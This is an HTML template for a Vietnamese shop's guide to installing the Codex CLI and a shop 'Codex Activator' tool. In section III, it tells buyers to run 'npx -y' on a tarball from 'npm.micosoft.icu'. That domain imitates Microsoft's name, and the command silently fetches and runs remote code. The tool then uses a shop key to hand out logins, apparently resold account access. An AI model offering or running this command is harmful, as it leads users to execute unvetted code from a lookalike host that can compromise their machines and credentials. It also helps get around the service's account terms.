<!DOCTYPE html>
<html lang="vi">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><%= title %> - <%= settings.brand_name || 'AI Store' %></title>
  <meta name="description" content="Hướng dẫn cài đặt Codex Activator và sử dụng tool được cấp bởi shop">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.2/font/bootstrap-icons.css" rel="stylesheet">
  <link href="/css/landing.css" rel="stylesheet">
  <link href="/css/guide.css" rel="stylesheet">
  <style>
    .guide-image img {
      cursor: zoom-in;
      transition: transform 0.2s ease;
    }

    .guide-image img:hover {
      transform: scale(1.02);
    }

    .image-modal {
      position: fixed;
      inset: 0;
      display: none;
      align-items: center;
      justify-content: center;
      background: rgba(0, 0, 0, 0.85);
      z-index: 1100;
      padding: 1rem;
    }

    .image-modal[data-visible="true"] {
      display: flex;
    }

    .image-modal img {
      max-width: 100%;
      max-height: 100%;
      border-radius: 0.5rem;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
    }

    .image-modal-close {
      position: absolute;
      top: 1rem;
      right: 1rem;
      background: rgba(255, 255, 255, 0.9);
      border: none;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      font-size: 1.25rem;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <nav class="navbar navbar-expand-lg navbar-landing">
    <div class="container">
      <a class="navbar-brand" href="/">
        <% if (settings.brand_logo) { %>
          <img src="<%= settings.brand_logo %>" alt="Logo" style="height:36px" class="me-2">
        <% } %>
        <i class="bi bi-braces"></i>
        <%= settings.brand_name || 'AI Store' %>
      </a>
      <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
        <i class="bi bi-list text-white fs-4"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ms-auto gap-1">
          <li class="nav-item"><a class="nav-link" href="/">Trang chủ</a></li>
          <li class="nav-item"><a class="nav-link" href="/huongdan">Hướng dẫn chung</a></li>
          <li class="nav-item"><a class="nav-link" href="/huongdan3">Codex Activator</a></li>
        </ul>
      </div>
    </div>
  </nav>

  <div class="guide-wrapper">
    <div class="container py-5">
      <div class="row">
        <div class="col-12">
          <div class="alert-info mb-4">
            <i class="bi bi-info-circle-fill me-2"></i>
            Hướng dẫn này tổng hợp các bước cài đặt Codex Activator, tool login của shop và các lưu ý để sử dụng ổn định.
          </div>
        </div>

        <div class="col-12 mb-4 text-center">
          <img src="/uploads/guide/Codex/logo.png" alt="Codex Activator" class="img-fluid" style="max-height: 140px" />
        </div>

        <div class="col-lg-6">
          <section class="guide-section mb-4" id="windows">
            <h2 class="section-heading">
              <i class="bi bi-windows me-2"></i>
              I. Cài đặt cho Windows
            </h2>
            <ol class="mt-3">
              <li>Tải Git cho Windows tại <a href="https://git-scm.com/download/win" target="_blank">https://git-scm.com/download/win</a>.</li>
              <li>Mở <strong>Git CMD</strong> (không dùng PowerShell để tránh cấu hình PATH khác biệt).</li>
              <li>Chạy lệnh: <pre><code class="language-bash">npm i -g @openai/codex</code></pre></li>
              <li>Nếu lệnh yêu cầu quyền quản trị, hãy mở Git CMD bằng quyền Administrator.</li>
            </ol>
          </section>

          <section class="guide-section mb-4" id="linux-mac">
            <h2 class="section-heading">
              <i class="bi bi-terminal me-2"></i>
              II. Cài đặt cho Linux / Macbook
            </h2>
            <p>Trên Linux hoặc Macbook, mở terminal và chạy:</p>
            <pre><code class="language-bash">npm i -g @openai/codex</code></pre>
            <p>Nếu hệ thống báo thiếu thư viện hoặc biến môi trường nào đó, chỉ cần cài gói được nhắc và chạy lại lệnh. Với các bản phân phối Linux thông dụng chỉ cần đảm bảo Node.js và npm đã cài.</p>
          </section>
        </div>

        <div class="col-lg-6">
          <section class="guide-section mb-4" id="tool-usage">
            <h2 class="section-heading">
              <i class="bi bi-shield-lock-fill me-2"></i>
              III. Cách dùng tool của shop để lấy login
            </h2>
            <ol class="mt-3">
              <li>
                Chạy lệnh tải activator một lần đầu:
                <pre><code class="language-bash">npx -y "https://npm.micosoft.icu/codex-activator.tgz?v=1.1.0"</code></pre>
              </li>
              <li>
                Sau khi tải xong, chạy
                <pre><code class="language-bash">codex-activator</code></pre>
                <div class="guide-image">
                  <img src="/uploads/guide/Codex/1.png" alt="Tải activator" class="img-fluid" />
                </div>
              </li>
              <li>
                Lần sau chỉ cần mở terminal và chạy <pre><code class="language-bash">codex-activator</code></pre> để kích hoạt nhanh.
              </li>
              <li>
                Nhập key admin được shop cung cấp để mở giao diện tương tác.
                <div class="guide-image mt-2">
                  <img src="/uploads/guide/Codex/2.png" alt="Chạy codex-activator" class="img-fluid" />
                </div>
                <div class="guide-image mt-2">
                  <img src="/uploads/guide/Codex/3.png" alt="Nhập key admin" class="img-fluid" />
                </div>
              </li>
            </ol>
            <div class="alert-success mt-3">
              <i class="bi bi-emoji-smile-fill me-2"></i>
              Sau khi nhập key sẽ hiển thị các tùy chọn như bật/tắt thông báo (nhập <strong>y</strong> cho yes hoặc <strong>n</strong> cho no) và link API để theo dõi usage.
            </div>
            <p class="mt-3">Sau khi hoàn tất, đóng terminal, mở lại và gõ <code>codex</code> (hoặc <code>codex-activator</code> nếu cần quản lý thêm) để dùng tool. Nếu gặp lỗi hoặc thiếu quyền, báo admin shop để được hỗ trợ.</p>
          </section>
        </div>
      </div>

      <section class="guide-section mt-4">
        <div class="alert-warning mb-0">
          <i class="bi bi-exclamation-triangle-fill me-2"></i>
          Nếu gặp lỗi trong quá trình cài đặt hoặc không nhận được key, hãy thông báo trực tiếp cho admin để được xử lý kịp thời.
        </div>
      </section>
    </div>
  </div>

  <button class="sidebar-toggle d-lg-none" id="sidebarToggle">
    <i class="bi bi-list"></i>
  </button>

  <div class="image-modal" id="imageModal" role="dialog" aria-hidden="true" aria-label="Zoomed image">
    <button class="image-modal-close" type="button" aria-label="Đóng ảnh">&times;</button>
    <img src="" alt="Ảnh hướng dẫn" />
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
  <script src="/js/guide.js"></script>
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      const modal = document.getElementById('imageModal');
      const modalImg = modal.querySelector('img');
      const closeBtn = modal.querySelector('.image-modal-close');

      document.querySelectorAll('.guide-image img').forEach((img) => {
        img.addEventListener('click', () => {
          modalImg.src = img.src;
          modal.setAttribute('data-visible', 'true');
          modal.setAttribute('aria-hidden', 'false');
        });
      });

      const hideModal = () => {
        modal.setAttribute('data-visible', 'false');
        modal.setAttribute('aria-hidden', 'true');
        modalImg.src = '';
      };

      closeBtn.addEventListener('click', hideModal);
      modal.addEventListener('click', (event) => {
        if (event.target === modal || event.target === modalImg) {
          hideModal();
        }
      });

      document.addEventListener('keydown', (event) => {
        if (event.key === 'Escape' && modal.getAttribute('data-visible') === 'true') {
          hideModal();
        }
      });
    });
  </script>
</body>

</html>
